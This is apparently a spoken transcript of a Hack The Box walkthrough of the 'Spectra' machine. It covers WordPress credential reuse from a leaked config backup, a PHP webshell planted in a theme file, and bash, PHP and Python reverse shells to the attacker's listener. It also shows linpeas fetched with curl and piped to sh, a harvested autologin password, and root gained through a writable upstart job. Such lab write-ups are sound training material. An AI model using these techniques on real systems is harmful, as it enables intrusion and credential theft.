 what's going on youtube this is ipsec i'm doing spectra from hack the box which starts off with finding two links the first link goes to a wordpress site that doesn't really have any vulnerabilities but you can enumerate a username based upon it being the author of a blog post and the second link is just a backup that contains all the wordpress files digging into that you can find wp-config.php and get a password that uses to connect to the database out of it and then through password reuse you can log into the wordpress site using administrator which again if you did enumeration you know the usernames so inside the wordpress admin there are a few ways to get shell you can upload plugins edit themes etc um i like just adding a theme because i find that to be safer if you upload a plugin something goes wrong you can take the site down so with a shell on the box you discover you're actually on a chromebook not like a normal server and doing some enumeration there you find some auto login scripts so you can just get the password and log in with that being said let's jump in as always we begin with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and then we'll call it this is spectra and the ip address of 101010229 this can take some time to run so i'm going to add the v flag so we see open ports as nmap finds it and there's three ports right now we have 80 which is http ssh which is 22 and then 3306 which is my sequel i'm gonna go take a look at http first because well that's where there's the most stuff and going over into this page we see issue tracking until it sets up jira we can configure this for issue tracking and then it gives a link the very first one is spectra.htb slash main slash index.htb index.php and of course we can't find that so we have to add it into our host file so i'm going to copy this to sudo vi etsy host and then we can add 10 10 10 1 2 2 9 spectra.htb and map has finished so let's just go take a look at nmap to see if there's anything else ssh on 22 we knew that but we don't have any type of server banner http on port 80 and again it's not telling us um what like distro it is normally when i see open ssh i'm used to it combining with like ubuntu debian something like that so right now i'm guessing maybe this is like a red hat machine because i don't think that does it by default and then we also have my sequel with none of the scripts working so nmap doesn't really help us that being said i do want to add a second nmap scan of dashp dash to just scan all ports so we can say all ports and let's disable the script and version there we go and refresh this page and while this goes we can take a look at the other link and there is a slash testing directory and slash testing gives us a database connection error and then this page it looks like a wordpress website so i'm going to run wp scan right off the bat so let's do wp scan dash h to show help and the things i like doing is of course url and then i like changing detection mode to aggressive and that's just going to make a request on like every single plugin instead of just checking the web page looking at the source and enumerate it that way and i like doing dash e to enumerate all plugins so maybe we should be typing these out so wp scan um let's turn draw a different pane so wp scan dash dash url uh that's aggressive so we want to put this here then dash detection mode aggressive enumerate all plug-ins and what else is there uh we don't want to do stealthy because we're numering and aggressive and i think detection mode will work with plugins as well um i'm not exactly positive i only really care about well let's just see what happens detection mode and plug-in detection mode are like two things i'm never consistent on and the last thing i want to find out how to write a file so dash o so you can do dash o wp scan and then while that goes we can just take a look at the page there seems to only be one post and that post is by administrator so wordpress has a user i'm going to go over into obsidian where i take notes and let's just cat and map spectra.nmap and then we will copy it to clipboard paste and then we can go to creds and let's see service user password notes this is generally how i like organizing this and then this will be wordpress administrator we don't have a password or notes but it's always helpful to just put this information down as you go uh looking at comments we don't have any comments we could try to find another user by switching this um author equals one so if i copy this link we could try also equals two and keep going down the list until like 10 or so and see if anything else comes back but wp scans also going to do this for us so i don't think we have to enumerate this wordpress anymore because we have some type of detect uh wait could not have finished that quickly huh it did let's see i think it's plug and detection so is it plug-in detection let's see where is this is it plug-ins detection enumerate plug-ins detection i'm used to this taking like 20 to 30 minutes so that's how i knew it was not done we could just take a look at wp scan to see what it found no api we don't really have anything it just has like this xml rpc being enabled but that being enabled by default i don't find it to be that serious we could do a brute force against that to um log in but we can also just go to like wp admin and log in so doesn't look like there's anything no plugins found so let's take a look at this this is a database error but this looks like it's a wordpress database error um it doesn't say it in the source maybe there's like a wp dash uh wp die message so we know yeah that is a wordpress message wordpress likes putting things in wp dash um looking at this link though it linked us directly to index.php i'm just gonna see if there's like anything in this testing directory and i did not expect a open listing i was seeing if maybe it was like a html or something but normally when you go to a directory and you got a php file it index file it'll open it so there's something configured on this directory that's preventing that so the very first thing i'd like to do is go into content and plugins and see what plugins are installed because this looks like the source code of wordpress and i don't see anything let's see admin license we can't open any dot php file because php process it but there was a one that did not end in dot php the wpconfig.php.save we don't have anything displayed here but um if we press ctrl u to view source we do um the reason why we didn't see anything without doing control u is web pages generally hide everything between these little carrots so because this php tag is there it kind of hit it we do have a database user and password and since mysql is listening on this box let's try logging in so very first thing let's just dev dev test dev team one so service my sequel user um devtest password devteamo1 db is going to be dev so if we do this yep that's good so let's try logging in so i'm going to do my sequel dash h for host 10 10 10 2 2 9 dash u for user dev team dash p uh we don't put the password on a terminal line it's just a lot of um programs default to not allowing that to be kind of secure because if i put the password here and someone did like a ps ef they could grab the password off that line so it's always good habit to not put the password there and always just let it prompt you for the password so we try logging in with the password of devteam01 and it's taking its way time and we see host 1010142 is not allowed to connect to this mysql server so this error message says the password is good but the host isn't allowed to log in in mysql when you start creating users the users are tied to the ip address logging in so it would be like um i forget like identified by password from this is probably not the correct syntax but whenever you specify the credentials you specify uh the user and then the ip address that it's allowed to log in normally most my sequel things on these type of web servers are only allow 127.00 to log in with that credential sometimes you will get them when they put a percent and percent in sql is a wild card at least my sequel so long way to say nothing really valuable because we're not allowed to connect so let's try sshing so ssh101010229 uh we don't really have a username i'm going to try devteam and then just make sure we got this password on our clipboard try logging in and we don't let's go over to the wordpress site and try using it so if we go to spectra.htb slash main and then we want to do wp-admin uh not google what uh this wp login.php no why are you going to google uh wp admin okay let's do about config and disable that ability in firefox because that is getting annoying if you're curious that is the keyword so now we have disabled that so if i type something in it doesn't exist it won't google did i just like randomly type a domain because this is going somewhere um certainly it's only valid for yeah so it just put a dot-com on there i was hoping to get a like does not exist yeah that's what we normally get so doesn't go to google anymore so let's try wp-admin and there we go let's make sure we have that password so i'm going to grab devteam01 and the username i'm going to do is administrator and the reason why i'm doing that is when we're enumerating users on this website we only found administrator we didn't find anyone else so we have this and it looks like those credentials work so let's go back to our notes and put devteam01 right there and we are now in wordpress so it is running 36561 we could just copy this and paste it in notes uh sure that well see wordpress like that and let's see what do we have one post one comment nothing interesting so we are admitting on this the way i like getting shelves on wordpress is going through the themes we could potentially go through a plug-in and add a plug-in but i don't like doing that because it can cause issues so let's go theme or stability issues um the reason why is if you do a plug-in and it accesses all pages and you do like just a rev shell and then your ref shell is no longer listening then you kind of break wordpress or at least that page if you do it on an inactive theme and something goes wrong no one actually hits it because the theme's inactive so that's why i like going and doing an inactive one so we can see the active theme is 2020. i'm going to do 2019 or 2017. so let's go themes theme editor i think this is it yep and then we want to change away from 2020 let's do 2019 select and then let's go to some page let's do four or four so now we can go all the way to the bottom again i like going to the bottom to do this because um if you do it in the top and have an error message it can hang things a bit better or a bit longer so i'm going to do a php and we'll do system request ipsec so now we're just going to execute anything there and we should do like an if is set so if people hit this page and this request doesn't exist they don't get an error message but i'm lazy so let's just update this file and then we have to go to the theme so that's going to be at this is spectra.htb slash main slash wp content slash themes slash 2019 404.php i believe and here's that error message we get um call to undefined wait get ahead that shouldn't be undefined um ipsec who am i yeah that i guess this whole template is worked let's just update this file there we go we got the username nginx so let's try getting a reverse shell i'm going to send this over to brep suite let's make sure we are intercepting send control r control shifter and now let's change the request method and put a reverse shell here so bash dash c bash dash i dev tcp 10 10 14 3 mi 3 or 2 i'm 2 2 9 000 1 0 and 1 and control u to url encode this nclvnp9001 there we go send uh caller undefined function and it did not work let's see c bash dash i dev tcp 10 10 14 2 huh let's try curl 10 10 14 2 9 000 1. so curl works so that bash reverse shell just does not seem to work let's try a different one um reverse shell cheat sheet and let's turn off oh i'm not um using that as a search bar anymore okay so that one doesn't work we can try old faithful this one works like in most cases however it's just got so many bad characters it's annoying to use let's see send i cannot execute a blank command undefined index ipsec i guess i put a few blank lines ipsec who am i nginx so it looks like that reverse shell is not working so let's see i guess we can try a php one and let's just go if we're doing this php one we don't want to do a system i think i copied php i did not php and let's do 10 10 14 2 9 000 1. we don't put it in quotes okay let's try this update file we're listing on 9001 we can now just change this to be who am i gotta show but it did not stay open well this is getting annoying um let's see uh let's go to cp user share num php php reverse shell.php yep this is the one i want we just gotta find the ip this is the one in php that almost always works i don't know if i've ever really seen this not work if there wasn't like blacklisted functions within php so when i said old faithful this definitely is old faithful um let's paste this update file and notice i'm not erasing this piece so i can always go back and restore this file if something goes horribly wrong so let's go back here let's just do nc lvmp 9001 and see if this works there we go finally have a reverse shell um which python which python3 uh which script we don't have like anything in this um you name dash a let's see cd etsy ls grep lsb grep release cat lsb i wasn't what if i made a typo see this is oh chrome os so let's see i don't know what to do here i'm going to try i guess um lemon so make dirt dub dub dub cd dub dub dub cp user not that cp opt approval escalation lin p's and then the file is omncd cp linp's rsh python3 server curl 10 10 14 2 8 000 linps rsh pipe it over to sh i was going to pipe it to bash but bash may not be here i'm not used to being on a chrome or a chromebook so let's see i'm going to i guess pause the video and let this run and then we'll go over the output it could take a while maybe i don't know so so i was going to let this lin piece finish before i went over anything but i'm getting impatient so let's go to the top it's taking forever to run so let's see wow there's a lot of output here okay so operating system uh not exactly sure what that is neverwhere cloud ready builder uh chromium os sudo nothing cpu info nothing too interesting that is a high sda we got sda23 uh some type of encryption that could be default to chrome os i'm not an expert here any disks in dev yeah one disk with a lot of partitions uh unmounted processes what is running as root new dev see my sequel safe so i don't think we can do the um what is it oh it's even running as user i was going to say ufw um user defined functions within my secret code execution don't see anything here there's our reverse shell we got stuff in slash opt so we should take a look at opt if we get confused python 2.7 is installed so we can get a tty i don't know what this neverwhere install service is see nothing too interesting dbus config files network information interfaces nothing interesting here pgp keys super users we have a user katie we are the nginx user already and there's chronos so maybe that's the default um chrome thing i wonder if chromebooks have a default password i'm guessing not login now password policy my sql version just the wp config file it found tomcat users ssh keys there's a lot of stuff here passwd files uh what is this order login passwd summer here we come what are you finding so etsy auto login so let's put this password here service auto login we don't know the user and we got the password and it's still running so what i'm going to do is let's get a second netcat shell so nclvnp 9001 uh did it revert let's update the file again there we go python 2.7 dash c import pty pty dot spawn then bash stty raw minus echo fgn earner there we go so we can go into this op directory and we got the auto login stuff and this is where we saw the password we saw it in etsy auto login and this looks like how um chrome os auto logins at boot so if we go here etsy auto login passwd okay so it's just injecting keys at the login prompt if we go to slash home it's probably the password to either kerners or kd so let's try logging in as either them so s u dash chronos did i spell that right yep uh okay let's ssh chronos at 10 10 10 2 2 9 paste the password can't get in let's try katie and we log in so that is katie's password so we got a log directory and nothing in it let's do sudo dash l and we can do spin a net ctl so let's go over to gtfo bins gtfo bins and of course that's not set to go to google anymore gtfo bins search and there's nothing here um let's see man annette ctl uh init ctl dash h slash s pen what is this dash help c session d boss c c d etsy ls grep init see init dot d let's go in a net see pseudo s been a net ctl rt limits all right once my password which is somewhere here we come paste a net ctl see i don't know how to use this command help let's see upstart for a list of commands try and knit ctl help okay a net dtl status missing job name net ctl list okay is there like a bluetooth here there is bluetooth d.com let's see can we edit these scripts let's do a groups i'm on developers uh we got these test scripts so let's do v test.conf description start on file system echo exec so what if i just um exec chmod um what if i didn't just do exact sh or i just drop into a shell so let's do sudo spin a net ctl stop test test.conf unknown job start test test running process so let's do stop test cast.confirm let's do chmod four seven five five slash bin sh that should set the sticky bit on this uh that's running dash so slash ben not sticky set uid bit i don't know why like that bit got be called the sticky bit exact chmod 4755 user ben dash start test lsla been bendash that does not seem to work so let's make this a bit simpler let's just go and edit test.conf and we'll do exact who am i to slash temp please subscribe so now when we start this lsla on slash temp we do have please subscribe if we cat slash temp please subscribe we get root so we do have code execution um for some reason we just couldn't do that chmod so let's try doing a reverse shell which and c uh node netcat but we do have python so we can do a verse shell cheat sheet and let's do python and it's python 2.7 remember so let's edit this exec one of this is going to work with all these bad characters so 10 10 14 2 9001 and i think i said it was 2.7 so we can exit this shell we don't need this anymore and see lvnp 9001 try running less and we get a shell and we arrow so that is the box hope you guys enjoyed it take care and i will see you all next week